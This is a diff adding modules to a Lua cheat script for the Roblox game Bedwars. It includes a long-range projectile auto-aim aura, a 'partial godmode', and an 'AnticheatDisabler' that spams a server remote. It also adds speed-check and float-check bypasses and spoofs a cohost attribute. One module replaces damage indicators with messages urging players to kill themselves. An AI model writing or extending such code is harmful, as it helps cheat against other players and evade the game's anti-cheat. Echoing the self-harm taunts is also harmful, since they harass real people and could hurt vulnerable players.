+								lplr.Character.HumanoidRootPart.Velocity = Vector3.new(lplr.Character.HumanoidRootPart.Velocity.X, -1, lplr.Character.HumanoidRootPart.Velocity.Z)
+								lplr.Character.HumanoidRootPart.CFrame = CFrame.new(ray.Position) + Vector3.new(0,3,0)
+							else
+								warningNotification("TPDown", "Failed to find ground", 3)
+							end
+						end
+					end
+				end)
+
+			    TPDown.ToggleButton(false)
+			end
+		end
+	})
+	Ground = TPDown.CreateToggle({
+		Name = "Ground",
+		Function = function() end,
+		Default = false,
+	})
+	Studs = TPDown.CreateSlider({
+		Name = "Studs",
+		Function = function() end,
+		Min = 1,
+		Max = 100,
+		Default = 10
+	})
+end)
+
+runFunction(function()
+	local DamageExploit = {Enabled = false}
+	local damagetick = tick()
+	DamageExploit = GuiLibrary.ObjectsThatCanBeSaved.BlatantWindow.Api.CreateOptionsButton({
+		["Name"] = "DamageExploit",
+		["Function"] = function(callback)
+			if callback then 
+				task.spawn(function()
+					table.insert(DamageExploit.Connections, vapeEvents.EntityDamageEvent.Event:Connect(function(damageTable)
+						if damageTable.entityInstance == lplr.Character and (damageTable.damageType ~= 0 or damageTable.extra and damageTable.extra.chargeRatio ~= nil) and (not (damageTable.knockbackMultiplier and damageTable.knockbackMultiplier.disabled or damageTable.knockbackMultiplier and damageTable.knockbackMultiplier.horizontal == 0)) then 
+							damagetick = tick() + 5 / 5
+						end
+					end))
+
+					RunLoops:BindToHeartbeat("DamageExploit", function(delta)
+						if damagetick > tick() then
+							if longjumping == true then return end
+							damagethingy = true
+							if GuiLibrary.ObjectsThatCanBeSaved["Lobby CheckToggle"].Api.Enabled then
+								if bedwarsStore.matchState == 0 then return end
+							end
+
+							if entityLibrary.isAlive then
+								if not isnetworkowner(entityLibrary.character.HumanoidRootPart) and (not GuiLibrary.ObjectsThatCanBeSaved.InfiniteFlyOptionsButton.Api.Enabled) and (not GuiLibrary.ObjectsThatCanBeSaved.FlyOptionsButton.Api.Enabled) and (not GuiLibrary.ObjectsThatCanBeSaved.LongJumpOptionsButton.Api.Enabled) then return end
+								if GuiLibrary.ObjectsThatCanBeSaved.GrappleExploitOptionsButton and GuiLibrary.ObjectsThatCanBeSaved.GrappleExploitOptionsButton.Api.Enabled then return end
+								for i, v in pairs(entityLibrary.character.Humanoid:GetPlayingAnimationTracks()) do
+									if v.Name == "WalkAnim" or v.Name == "RunAnim" then
+										v:AdjustSpeed(10 / 12)
+									end
+								end
+
+								local speedValue = getSpeed()
+
+								local speedVelocity = entityLibrary.character.Humanoid.MoveDirection * (22 or speedValue)
+								entityLibrary.character.HumanoidRootPart.Velocity = Vector3.new(speedVelocity.X, entityLibrary.character.HumanoidRootPart.Velocity.Y, speedVelocity.Z)
+								local speedCFrame = entityLibrary.character.Humanoid.MoveDirection * (40 - 20) * delta
+
+								RaycastParams.new().FilterDescendantsInstances = {lplr.Character}
+								local ray = workspace:Raycast(entityLibrary.character.HumanoidRootPart.Position, speedCFrame, RaycastParams.new())
+
+								if ray then
+									speedCFrame = (ray.Position - entityLibrary.character.HumanoidRootPart.Position)
+								end
+
+								entityLibrary.character.HumanoidRootPart.CFrame = entityLibrary.character.HumanoidRootPart.CFrame + speedCFrame
+							else
+								damagethingy = false
+							end
+						end
+					end)
+				end)
+			else
+				RunLoops:UnbindFromHeartbeat("DamageExploit")
+			end
+		end
+	})
+end)
+
+runFunction(function()
+	local ProjectileAura = {Enabled = false}
+	local ProjectileAuraRange = {Value = 40}
+	local ProjectileAuraAim = {Enabled = false}
+	local projectileRemote = bedwars.ClientHandler:Get(bedwars.ProjectileRemote)
+	local AimPart
+	local lastTarget
+	local fireDelays = {}
+
+	local function shootProjectile(item, ammotypething)
+		local plr = EntityNearPosition(ProjectileAuraRange.Value)
+		lastTarget = plr
+		if AimPart ~= nil and plr then
+			if plr.Humanoid.Health ~= 0 then
+				if EntityNearPosition(20) then return end
+				if plr.Character:GetAttribute("InfernalShieldRaised") then return end
+				local projsource = bedwars.ItemTable[item.itemType].projectileSource
+				local ammo = projsource.projectileType(ammotypething)	
+				local projmeta = bedwars.ProjectileMeta[ammo]
+				local startPos = AimPart.CFrame + Vector3.new(0,1.5,0)
+				local offsetStartPos = startPos.p
+				local prediction = (worldmeta and projmeta.predictionLifetimeSec or projmeta.lifetimeSec or 3)
+				local launchvelo = (projmeta.launchVelocity or 100)
+				local gravity = (projmeta.gravitationalAcceleration or 196.2)
+				local multigrav = gravity
+				local pos = plr.RootPart.Position
+				local playergrav = workspace.Gravity
+				local balloons = plr.Character:GetAttribute("InflatedBalloons")
+				if balloons and balloons > 0 then 
+					playergrav = (workspace.Gravity * (1 - ((balloons >= 4 and 1.2 or balloons >= 3 and 1 or 0.975))))
+				end
+					
+				if plr.Character.PrimaryPart:FindFirstChild("rbxassetid://8200754399") then 
+					playergrav = (workspace.Gravity * 0.3)
+				end
+		
+				local shootpos, shootvelo = predictGravity(pos, plr.RootPart.Velocity, (pos - offsetStartPos).Magnitude / launchvelo, plr, playergrav)
+				if projmeta.projectile == "telepearl" then
+					shootpos = pos
+					shootvelo = Vector3.zero
+				end
+		
+				local newlook = CFrame.new(offsetStartPos, shootpos) * CFrame.new(Vector3.new(-bedwars.BowConstantsTable.RelX, -bedwars.BowConstantsTable.RelY, -bedwars.BowConstantsTable.RelZ))
+				shootpos = newlook.p + (newlook.lookVector * (offsetStartPos - shootpos).magnitude)
+				local calculated = LaunchDirection(offsetStartPos, shootpos, launchvelo, multigrav, false)
+		
+				if calculated then 
+					local launchpos1 = offsetStartPos
+					local launchpos2 = offsetStartPos
+					local guid = game:GetService("HttpService"):GenerateGUID()
+					switchItem(item.tool)
+					projectileRemote:CallServerAsync(item.tool, ammotypething, ammo, launchpos1, launchpos2, calculated, guid, {drawDurationSeconds = 1}, workspace:GetServerTimeNow() - 0.045)
+					task.wait(projsource.fireDelaySec)
+				end
+            end
+		end
+	end
+
+	ProjectileAura = GuiLibrary.ObjectsThatCanBeSaved.GalaxywareWindow.Api.CreateOptionsButton({
+        Name = "ProjectileTPAura",
+        Function = function(callback)
+			if callback then 
+				AimPart = Instance.new("Part", workspace)
+				AimPart.Anchored = true
+				AimPart.CanCollide = false
+
+				task.spawn(function()
+					while true do
+						if (not ProjectileAura.Enabled) then return end
+
+						if (not ProjectileAuraAim.Enabled) then
+                            AimPart.Transparency = 1
+						else
+							AimPart.Transparency = 0
+						end
+						
+						local closestPlayer
+						local closestDistance = math.huge
+						
+						for i, v in pairs(game:GetService("Players"):GetChildren()) do
+							if v.Team ~= lplr.Team and IsAlive(v) and IsAlive(lplr) and not v.Character:FindFirstChildOfClass("ForceField") then
+								if v and v ~= lplr then
+									local TargetDistance = lplr:DistanceFromCharacter(v.Character:FindFirstChild("HumanoidRootPart").CFrame.p)
+									if TargetDistance < closestDistance then
+										closestPlayer = v
+										closestDistance = TargetDistance
+									end
+								end
+							end
+						end
+						
+						if closestPlayer then
+							AimPart.Position = closestPlayer.Character.HumanoidRootPart.Position + (closestPlayer.Character.HumanoidRootPart.Velocity*0.4)
+						else
+							AimPart.Position = Vector3.new()
+						end
+						
+						task.wait()
+					end
+				end)
+
 				task.spawn(function()
 					repeat
 						task.wait()
-						local item = getItemNear("scythe")
-						if item and lplr.Character.HandInvItem.Value == item.tool and bedwars.CombatController then 
-							bedwars.ClientHandler:Get("ScytheDash"):SendToServer({direction = Vector3.new(9e9, 9e9, 9e9)})
-							if entityLibrary.isAlive and entityLibrary.character.Head.Transparency ~= 0 then
-								bedwarsStore.scythe = tick() + 1
+						if GuiLibrary.ObjectsThatCanBeSaved["Lobby CheckToggle"].Api.Enabled then 
+							if bedwarsStore.matchState == 0 then continue end
+						end
+
+						if entityLibrary.isAlive then
+							if getItem("arrow") then
+								for slot, item in pairs(bedwarsStore.localInventory.inventory.items) do
+									if item.itemType:find("bow") then 
+										if fireDelays[item.itemType] == nil or fireDelays[item.itemType] < tick() then
+											task.spawn(shootProjectile, item, "arrow")
+											fireDelays[item.itemType] = tick() + bedwars.ItemTable[item.itemType].projectileSource.fireDelaySec
+										end
+									end
+								end
+							end
+						else
+							lastTarget = nil
+						end
+					until (not ProjectileAura.Enabled)
+				end)
+
+				task.spawn(function()
+					repeat
+						vapeTargetInfo.Targets.ProjectileAura = lastTarget and {
+							Humanoid = {
+								Health = (lastTarget.Character:GetAttribute("Health") or lastTarget.Humanoid.Health) + getShieldAttribute(lastTarget.Character),
+								MaxHealth = lastTarget.Character:GetAttribute("MaxHealth") or lastTarget.Humanoid.MaxHealth
+							},
+							Player = lastTarget.Player
+						}
+						task.wait()
+					until (not ProjectileAura.Enabled)
+				end)
+			else
+				vapeTargetInfo.Targets.ProjectileAura = nil
+			end
+		end
+	})
+	ProjectileAuraRange = ProjectileAura.CreateSlider({
+		Name = "Range",
+		Function = function() end,
+		Min = 1,
+		Max = 1000000,
+		Default = 1000000
+	})
+	ProjectileAuraAim = ProjectileAura.CreateToggle({
+		Name = "Show Aim Part",
+		Function = function() end,
+		Default = false,
+	})
+end)
+
+function IsAlive(plr)
+    plr = plr or lplr
+    if not plr.Character then return false end
+    if not plr.Character:FindFirstChild("Head") then return false end
+    if not plr.Character:FindFirstChild("Humanoid") then return false end
+    if plr.Character:FindFirstChild("Humanoid").Health < 0.11 then return false end
+    return true
+end
+
+runFunction(function()
+    local GodMode = {Enabled = false}
+    GodMode = GuiLibrary.ObjectsThatCanBeSaved.GalaxywareWindow.Api.CreateOptionsButton({
+        Name = "PartialGodmode",
+        Function = function(callback)
+            if callback then
+				spawn(function()
+					while task.wait() do
+						if (not GodMode.Enabled) then return end
+						if (not GuiLibrary.ObjectsThatCanBeSaved.FlyOptionsButton.Api.Enabled) and (not GuiLibrary.ObjectsThatCanBeSaved.InfiniteFlyOptionsButton.Api.Enabled) then
+							for i, v in pairs(game:GetService("Players"):GetChildren()) do
+								if v.Team ~= lplr.Team and IsAlive(v) and IsAlive(lplr) then
+									if v and v ~= lplr then
+										local TargetDistance = lplr:DistanceFromCharacter(v.Character:FindFirstChild("HumanoidRootPart").CFrame.p)
+										if TargetDistance < 25 then
+											if not lplr.Character.HumanoidRootPart:FindFirstChildOfClass("BodyVelocity") then
+												repeat task.wait() until bedwarsStore.matchState ~= 0
+												if not (v.Character.HumanoidRootPart.Velocity.Y < -10*5) then
+													lplr.Character.Archivable = true
+			
+													local Clone = lplr.Character:Clone()
+													Clone.Parent = workspace
+													Clone.Head:ClearAllChildren()
+													gameCamera.CameraSubject = Clone:FindFirstChild("Humanoid")
+				
+													for i,v in pairs(Clone:GetChildren()) do
+														if string.lower(v.ClassName):find("part") and v.Name ~= "HumanoidRootPart" then
+															v.Transparency = 1
+														end
+														if v:IsA("Accessory") then
+															v:FindFirstChild("Handle").Transparency = 1
+														end
+													end
+				
+													lplr.Character.HumanoidRootPart.CFrame = lplr.Character.HumanoidRootPart.CFrame + Vector3.new(0,100000,0)
+				
+													game:GetService("RunService").RenderStepped:Connect(function()
+														if Clone ~= nil and Clone:FindFirstChild("HumanoidRootPart") then
+															Clone.HumanoidRootPart.Position = Vector3.new(lplr.Character.HumanoidRootPart.Position.X, Clone.HumanoidRootPart.Position.Y, lplr.Character.HumanoidRootPart.Position.Z)
+														end
+													end)
+				
+													task.wait(0.3)
+													lplr.Character.HumanoidRootPart.Velocity = Vector3.new(lplr.Character.HumanoidRootPart.Velocity.X, -1, lplr.Character.HumanoidRootPart.Velocity.Z)
+													lplr.Character.HumanoidRootPart.CFrame = Clone.HumanoidRootPart.CFrame
+													gameCamera.CameraSubject = lplr.Character:FindFirstChild("Humanoid")
+													Clone:Destroy()
+													task.wait(0.15)
+												end
+											end
+										end
+									end
+								end
 							end
 						end
-					until (not Disabler.Enabled)
+					end
+				end)
+			end
+        end
+    })
+end)
+
+runFunction(function()
+	local AnimationPlayer = {Enabled = false}
+	local AnimationPlayerBox = {Value = "11335949902"}
+	local AnimationPlayerSpeed = {Speed = 1}
+	local playedanim
+	AnimationPlayer = GuiLibrary.ObjectsThatCanBeSaved.GalaxywareWindow.Api.CreateOptionsButton({
+		Name = "Invisibility",
+		Function = function(callback)
+			if callback then 
+				if entityLibrary.isAlive then 
+					if playedanim then 
+						playedanim:Stop() 
+						playedanim.Animation:Destroy()
+						playedanim = nil 
+					end
+					local anim = Instance.new("Animation")
+					local suc, id = pcall(function() return string.match(game:GetObjects("rbxassetid://"..AnimationPlayerBox.Value)[1].AnimationId, "%?id=(%d+)") end)
+                    if not suc then
+                        id = AnimationPlayerBox.Value
+                    end
+                    anim.AnimationId = "rbxassetid://"..id
+					local suc, res = pcall(function() playedanim = entityLibrary.character.Humanoid.Animator:LoadAnimation(anim) end)
+					if suc then
+                        lplr.Character.Humanoid.CameraOffset = Vector3.new(0, 3 / -2, 0)
+                        lplr.Character.HumanoidRootPart.Size = Vector3.new(2, 3, 1.1)
+						
+						playedanim.Priority = Enum.AnimationPriority.Action4
+						playedanim.Looped = true
+						playedanim:Play()
+						playedanim:AdjustSpeed(0 / 10)
+						table.insert(AnimationPlayer.Connections, playedanim.Stopped:Connect(function()
+							if AnimationPlayer.Enabled then
+								AnimationPlayer.ToggleButton(false)
+								AnimationPlayer.ToggleButton(false)
+							end
+						end))
+					else
+						warningNotification("AnimationPlayer", "failed to load anim : "..(res or "invalid animation id"), 5)
+					end
+				end
+				table.insert(AnimationPlayer.Connections, lplr.CharacterAdded:Connect(function()
+					repeat task.wait() until entityLibrary.isAlive or not AnimationPlayer.Enabled
+					task.wait(0.5)
+					if not AnimationPlayer.Enabled then return end
+					if playedanim then 
+						playedanim:Stop() 
+						playedanim.Animation:Destroy()
+						playedanim = nil 
+					end
+					local anim = Instance.new("Animation")
+					local suc, id = pcall(function() return string.match(game:GetObjects("rbxassetid://"..AnimationPlayerBox.Value)[1].AnimationId, "%?id=(%d+)") end)
+                    if not suc then
+                        id = AnimationPlayerBox.Value
+                    end
+                    anim.AnimationId = "rbxassetid://"..id
+					local suc, res = pcall(function() playedanim = entityLibrary.character.Humanoid.Animator:LoadAnimation(anim) end)
+					if suc then
+						playedanim.Priority = Enum.AnimationPriority.Action4
+						playedanim.Looped = true
+						playedanim:Play()
+						playedanim:AdjustSpeed(AnimationPlayerSpeed.Value / 10)
+						playedanim.Stopped:Connect(function()
+							if AnimationPlayer.Enabled then
+								AnimationPlayer.ToggleButton(false)
+								AnimationPlayer.ToggleButton(false)
+							end
+						end)
+					else
+						warningNotification("AnimationPlayer", "failed to load anim : "..(res or "invalid animation id"), 5)
+					end
+				end))
+			else
+				if playedanim then playedanim:Stop() playedanim = nil end
+			end
+		end
+	})
+end)
+
+runFunction(function()
+    fortniteballs = GuiLibrary.ObjectsThatCanBeSaved.GalaxywareWindow.Api.CreateOptionsButton({
+        Name = "BetterHighJump",
+        Function = function(callback)
+            if callback then
+                game.Workspace.Gravity = 0
+                repeat task.wait(0.01)
+                    local player = game.Players.LocalPlayer
+                    local character = player.Character or player.CharacterAdded:Wait()
+                    local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
+                    humanoidRootPart.CFrame = humanoidRootPart.CFrame + Vector3.new(0, 10, 0)
+                until (not fortniteballs.Enabled)
+            else
+                game.Workspace.Gravity = 196.2
+            end
+        end
+    })
+end)
+
+local Messages = {"Galaxyware on top", "You should kill yourself NOW!", "Your life is worth nothing!",}
+local old
+local FunnyIndicator = {Enabled = false}
+FunnyIndicator = GuiLibrary.ObjectsThatCanBeSaved.GalaxywareWindow.Api.CreateOptionsButton({
+Name = "GalaxywareDamageIndicators",
+Function = function(Callback)
+	FunnyIndicator.Enabled = Callback
+	if FunnyIndicator.Enabled then
+		old = debug.getupvalue(bedwars.DamageIndicator, 10)["Create"]
+		debug.setupvalue(bedwars.DamageIndicator, 10, {
+			Create = function(self, obj, ...)
+				spawn(function()
+					pcall(function()
+						obj.Parent.Text = Messages[math.random(1, #Messages)]
+						obj.Parent.TextColor3 = Color3.fromHSV(tick() % 10 / 10, 2, 2)
+					end)
+				end)
+				return game:GetService("TweenService"):Create(obj, ...)
+			end
+		})
+	else
+		debug.setupvalue(bedwars.DamageIndicator, 10, {
+			Create = old
+		})
+		old = nil
+	end
+end
+})
+
+local Host = {["Enabled"] = false}
+Host = GuiLibrary["ObjectsThatCanBeSaved"]["GalaxywareWindow"]["Api"].CreateOptionsButton({
+    ["Name"] = "Cohost",
+    ["HoverText"] = "real 2023 best bedwars script no client sided!1",
+    ["Function"] = function(callback)
+        if callback then
+            local v2 = require(game:GetService("ReplicatedStorage")["rbxts_include"]["node_modules"]["@easy-games"]["game-core"].out)
+            local OfflinePlayerUtil = v2.OfflinePlayerUtil
+            local v6 = OfflinePlayerUtil.getPlayer(game.Players.LocalPlayer)
+            v6:SetAttribute("Cohost", true)
+        else
+            local v2 = require(game:GetService("ReplicatedStorage")["rbxts_include"]["node_modules"]["@easy-games"]["game-core"].out)
+            local OfflinePlayerUtil = v2.OfflinePlayerUtil
+            local v6 = OfflinePlayerUtil.getPlayer(game.Players.LocalPlayer)
+            v6:SetAttribute("Cohost", false)
+        end
+    end
+})
+
+runFunction(function()
+    local RGBSwordOutline
+    RGBSwordOutline = GuiLibrary.ObjectsThatCanBeSaved.GalaxywareWindow.Api.CreateOptionsButton({
+        Name = "SwordOutline",
+        Function = function(callback)
+            if callback then 
+                spawn(function()
+                    local cam = game.Workspace.CurrentCamera
+                    Connection = cam.Viewmodel.ChildAdded:Connect(function(v)
+                        highlight2 = Instance.new('Highlight')
+                        highlight2.Parent = v.Handle
+                        if v:FindFirstChild("Handle") then
+                            pcall(function()
+                                highlight2.FillTransparency = 1
+                                while wait() do
+                                    highlight2.OutlineColor = Color3.fromHSV(tick()%5/5,1,1)
+                                end
+                            end)
+                        end
+                    end)
+                    spawn(function()
+                        repeat task.wait() until unejected == true 
+                        EnabledOutlines = false
+                        if Connection ~= nil then
+                            if type(Connection) == "userdata" then
+                                Connection:Disconnect()
+                                Connection = nil
+                            end
+                        end
+                    end)
+                end)
+            else
+                EnabledOutlines = false
+                if Connection ~= nil then
+                    if type(Connection) == "userdata" then
+                        Connection:Disconnect()
+                        Connection = nil
+                    end
+                end
+            end
+        end
+    })
+end)
+
+
+
+runFunction(function()
+    local coolpack = GuiLibrary.ObjectsThatCanBeSaved.GalaxywareWindow.Api.CreateOptionsButton({
+        Name = "TexturePack",
+        HoverText = "Made by 4zze with love for Galaxyware <3 (its not skidded ok)",
+        Function = function(callback)
+            if callback then
+
+				local Players = game:GetService("Players")
+				local ReplicatedStorage = game:GetService("ReplicatedStorage")
+				local Workspace = game:GetService("Workspace")
+				local objs = game:GetObjects("rbxassetid://14654171957")
+				local import = objs[1]
+				import.Parent = ReplicatedStorage
+				local index = {
+					{
+						name = "wood_sword",
+						offset = CFrame.Angles(math.rad(0), math.rad(-89), math.rad(-90)),
+						model = import:WaitForChild("Wood_Sword"),
+					},	
+					{
+						name = "stone_sword",
+						offset = CFrame.Angles(math.rad(0), math.rad(-89), math.rad(-90)),
+						model = import:WaitForChild("Stone_Sword"),
+					},
+					{
+						name = "iron_sword",
+						offset = CFrame.Angles(math.rad(0), math.rad(-89), math.rad(-90)),
+						model = import:WaitForChild("Iron_Sword"),
+					},
+					{
+						name = "diamond_sword",
+						offset = CFrame.Angles(math.rad(0), math.rad(-89), math.rad(-90)),
+						model = import:WaitForChild("Diamond_Sword"),
+					},
+					{
+						name = "rageblade",
+						offset = CFrame.Angles(math.rad(0), math.rad(-89), math.rad(-90)),
+						model = import:WaitForChild("Rageblade"),
+					},
+					{
+						name = "emerald_sword",
+						offset = CFrame.Angles(math.rad(0), math.rad(-89), math.rad(-90)),
+						model = import:WaitForChild("Emerald_Sword"),
+					},
+					{
+						name = "wood_scythe",
+						offset = CFrame.Angles(math.rad(0),math.rad(89),math.rad(-90)),
+						model = import:WaitForChild("Wood_Scythe"),
+					},
+					{
+						name = "stone_scythe",
+						offset = CFrame.Angles(math.rad(0),math.rad(89),math.rad(-90)),
+						model = import:WaitForChild("Stone_Scythe"),
+					},
+					{
+						name = "iron_scythe",
+						offset = CFrame.Angles(math.rad(0),math.rad(89),math.rad(-90)),
+						model = import:WaitForChild("Iron_Scythe"),
+					},
+					{
+						name = "diamond_scythe",
+						offset = CFrame.Angles(math.rad(0),math.rad(89),math.rad(-90)),
+						model = import:WaitForChild("Diamond_Scythe"),
+					},
+					{
+						name = "wood_pickaxe",
+						offset = CFrame.Angles(math.rad(0), math.rad(-10), math.rad(-95)),
+						model = import:WaitForChild("Wood_Pickaxe"),
+					},	
+					{
+						name = "stone_pickaxe",
+						offset = CFrame.Angles(math.rad(0), math.rad(-10), math.rad(-95)),
+						model = import:WaitForChild("Stone_Pickaxe"),
+					},	
+					{
+						name = "iron_pickaxe",
+						offset = CFrame.Angles(math.rad(0), math.rad(-10), math.rad(-95)),
+						model = import:WaitForChild("Iron_Pickaxe"),
+					},	
+					{
+						name = "diamond_pickaxe",
+						offset = CFrame.Angles(math.rad(0), math.rad(-89), math.rad(-95)),
+						model = import:WaitForChild("Diamond_Pickaxe"),
+					},
+					{
+						name = "diamond",
+						offset = CFrame.Angles(math.rad(0), math.rad(-90), math.rad(90)),
+						model = import:WaitForChild("Diamond"),
+					},
+					{
+						name = "iron",
+						offset = CFrame.Angles(math.rad(0), math.rad(-90), math.rad(90)),
+						model = import:WaitForChild("Iron"),
+					},
+					{
+						name = "emerald",
+						offset = CFrame.Angles(math.rad(0), math.rad(-90), math.rad(90)),
+						model = import:WaitForChild("Emerald"),
+					},
+}
+				local func = Workspace.Camera.Viewmodel.ChildAdded:Connect(function(tool)	
+					if not tool:IsA("Accessory") then return end	
+					for _, v in ipairs(index) do	
+						if v.name == tool.Name then		
+							for _, part in ipairs(tool:GetDescendants()) do
+								if part:IsA("BasePart") or part:IsA("MeshPart") or part:IsA("UnionOperation") then				
+									part.Transparency = 1
+								end			
+							end		
+							local model = v.model:Clone()
+							model.CFrame = tool:WaitForChild("Handle").CFrame * v.offset
+							model.CFrame *= CFrame.Angles(math.rad(0), math.rad(-50), math.rad(0))
+							model.Parent = tool			
+							local weld = Instance.new("WeldConstraint", model)
+							weld.Part0 = model
+							weld.Part1 = tool:WaitForChild("Handle")			
+							local tool2 = Players.LocalPlayer.Character:WaitForChild(tool.Name)			
+							for _, part in ipairs(tool2:GetDescendants()) do
+								if part:IsA("BasePart") or part:IsA("MeshPart") or part:IsA("UnionOperation") then				
+									part.Transparency = 1				
+								end			
+							end			
+							local model2 = v.model:Clone()
+							model2.Anchored = false
+							model2.CFrame = tool2:WaitForChild("Handle").CFrame * v.offset
+							model2.CFrame *= CFrame.Angles(math.rad(0), math.rad(-50), math.rad(0))
+							if v.name:match("rageblade") then
+								model2.CFrame *= CFrame.new(0.7, 0, -1)                           
+							elseif v.name:match("sword") or v.name:match("blade") then
+								model2.CFrame *= CFrame.new(.6, 0, -1.1) - Vector3.new(0, 0, -.3)
+							elseif v.name:match("axe") and not v.name:match("pickaxe") and v.name:match("diamond") then
+								model2.CFrame *= CFrame.new(.08, 0, -1.1) - Vector3.new(0, 0, -1.1)
+							elseif v.name:match("axe") and not v.name:match("pickaxe") and not v.name:match("diamond") then
+								model2.CFrame *= CFrame.new(-.2, 0, -2.4) + Vector3.new(0, 0, 2.12)
+							elseif v.name:match("scythe") then
+								model2.CFrame *= CFrame.new(-1.15, 0.2, -2.1)
+							elseif v.name:match("iron") then
+								model2.CFrame *= CFrame.new(0, -.24, 0)
+							elseif v.name:match("gold") then
+								model2.CFrame *= CFrame.new(0, .03, 0)
+							elseif v.name:match("diamond") then
+								model2.CFrame *= CFrame.new(0, .027, 0)
+							elseif v.name:match("emerald") then
+								model2.CFrame *= CFrame.new(0, .001, 0)
+							elseif v.name:match("telepearl") then
+								model2.CFrame *= CFrame.new(.1, 0, .1)
+							elseif v.name:match("bow") and not v.name:match("crossbow") then
+								model2.CFrame *= CFrame.new(-.29, .1, -.2)
+							elseif v.name:match("wood_crossbow") and not v.name:match("tactical_crossbow") then
+								model2.CFrame *= CFrame.new(-.6, 0, 0)
+							elseif v.name:match("tactical_crossbow") and not v.name:match("wood_crossbow") then
+								model2.CFrame *= CFrame.new(-.5, 0, -1.2)
+							else
+								model2.CFrame *= CFrame.new(.2, 0, -.2)
+							end
+							model2.Parent = tool2
+							local weld2 = Instance.new("WeldConstraint", model)
+							weld2.Part0 = model2
+							weld2.Part1 = tool2:WaitForChild("Handle")
+						end
+					end
+				end)          
+			end
+        end
+	})
+end)
+
+
+runFunction(function()
+	local ScytheLongJump = GuiLibrary.ObjectsThatCanBeSaved.GalaxywareWindow.Api.CreateOptionsButton({
+		["Name"] = "ScytheFastJump",
+		["Function"] = function(callback)
+			if callback then
+				game:GetService("TweenService"):Create(game.Players.LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(1), {Position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * 100}):Play()
+				warningNotification("ScytheFastJump", "Jump in 1s to not flag")
+			end
+		end
+	})
+end)
+
+runFunction(function()
+    local Disabler = { Enabled = true }
+
+    Disabler = GuiLibrary.ObjectsThatCanBeSaved.GalaxywareWindow.Api.CreateOptionsButton({
+        Name = "69UwUGirlsHotExploitV2",
+        Function = function(callback)
+            if callback then
+                task.spawn(function()
+                    local heartbeat = game:GetService("RunService").Heartbeat
+                    local lplr = game:GetService("Players").LocalPlayer
+
+                    while Disabler.Enabled do
+                        heartbeat:Wait()
+
+                        local scythe = getScytheInInventory(lplr)
+                        if scythe then
+                            lplr.Character.HandInvItem.Value = scythe.Name
+                            lplr.Character.HumanoidRootPart.Velocity = Vector3.new(0, -math.huge, 0)
+                            lplr.Character.Humanoid.WalkSpeed = math.huge -- Bypass speed check
+
+                            for _, descendant in ipairs(lplr.Character:GetDescendants()) do
+                                if descendant:IsA("BasePart") then
+                                    descendant.Velocity = Vector3.new(0, 0, 0)
+                                    descendant.CanCollide = false
+                                end
+                            end
+                        end
+                    end
+                end)
+            end
+        end,
+        HoverText = "Disables Float Check and Speed Check Bypass"
+    })
+end)
+
+game:GetService('RunService').RenderStepped:Connect(function()
+    local lplr = game:GetService("Players").LocalPlayer
+
+    local scythe = getScytheInInventory(lplr)
+    if scythe then
+        lplr.Character.HandInvItem.Value = scythe.Name
+        lplr.Character.HumanoidRootPart.Velocity = Vector3.new(0, -math.huge, 0)
+        lplr.Character.Humanoid.WalkSpeed = math.huge -- Bypass speed check
+
+        for _, descendant in ipairs(lplr.Character:GetDescendants()) do
+            if descendant:IsA("BasePart") then
+                descendant.Velocity = Vector3.new(0, 0, 0)
+            end
+        end
+    end
+end)
+
+function getScytheInInventory(player)
+    for _, item in ipairs(player.Character:GetChildren()) do
+        if item:IsA("Tool") and item.Name:lower():find("scythe") then
+            return item
+        end
+    end
+    return nil
+end
+
+runFunction(function()
+    local Disabler = { Enabled = true }
+
+    Disabler = GuiLibrary.ObjectsThatCanBeSaved.GalaxywareWindow.Api.CreateOptionsButton({
+        Name = "69SexyGirlsExploit",
+        Function = function(callback)
+            if callback then
+                task.spawn(function()
+                    local heartbeat = game:GetService("RunService").Heartbeat
+                    local lplr = game:GetService("Players").LocalPlayer
+
+                    while Disabler.Enabled do
+                        heartbeat:Wait()
+
+                        local scythe = getScytheInInventory(lplr)
+                        if scythe then
+                            lplr.Character.HandInvItem.Value = scythe.Name
+                            lplr.Character.HumanoidRootPart.Velocity = Vector3.new(0, -math.huge, 0)
+                            lplr.Character.Humanoid.WalkSpeed = math.huge
+
+                            for _, descendant in ipairs(lplr.Character:GetDescendants()) do
+                                if descendant:IsA("BasePart") then
+                                    descendant.Velocity = Vector3.new(0, 0, 0)
+                                    descendant.CanCollide = false
+                                end
+                            end
+                        end
+                    end
+                end)
+            end
+        end,
+        HoverText = "Disables Float Check and Speed Check Bypass"
+    })
+end)
+
+game:GetService('RunService').RenderStepped:Connect(function()
+    local lplr = game:GetService("Players").LocalPlayer
+
+    local scythe = getScytheInInventory(lplr)
+    if scythe then
+        lplr.Character.HandInvItem.Value = scythe.Name
+        lplr.Character.HumanoidRootPart.Velocity = Vector3.new(0, -math.huge, 0)
+        lplr.Character.Humanoid.WalkSpeed = math.huge
+
+        for _, descendant in ipairs(lplr.Character:GetDescendants()) do
+            if descendant:IsA("BasePart") then
+                descendant.Velocity = Vector3.new(0, 0, 0)
+            end
+        end
+    end
+end)
+
+function getScytheInInventory(player)
+    for _, item in ipairs(player.Character:GetChildren()) do
+        if item:IsA("Tool") and item.Name:lower():find("scythe") then
+            return item
+        end
+    end
+    return nil
+end
+
+local disabler = GuiLibrary.ObjectsThatCanBeSaved.GalaxywareWindow.Api.CreateOptionsButton({
+    Name = "AnticheatDisabler",
+    Function = function(callback)
+        if callback then
+            local ReplicatedStorage = game:GetService("ReplicatedStorage")
+            local Players = game:GetService("Players")
+            local RunService = game:GetService("RunService")
+            local ScytheDash = ReplicatedStorage:WaitForChild("rbxts_include"):WaitForChild("node_modules")["@rbxts"].net.out._NetManaged.ScytheDash
+
+            local function onRenderStepped()
+                local localPlayer = Players.LocalPlayer
+                if not localPlayer then
+                    return
+                end
+                local character = localPlayer.Character
+                if not character then
+                    return
+                end
+                local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
+                if humanoidRootPart then
+                    local lookVector = humanoidRootPart.CFrame.LookVector * 10000
+                    ScytheDash:FireServer({
+                        direction = lookVector
+                    })
+                end
+            end
+
+            local lastHeartbeat = tick()
+            local function onHeartbeat()
+                local currentTime = tick()
+                local elapsedSeconds = currentTime - lastHeartbeat
+                if elapsedSeconds > 999 then
+                    lastHeartbeat = currentTime
+                end
+            end
+
+            RunService.RenderStepped:Connect(onRenderStepped)
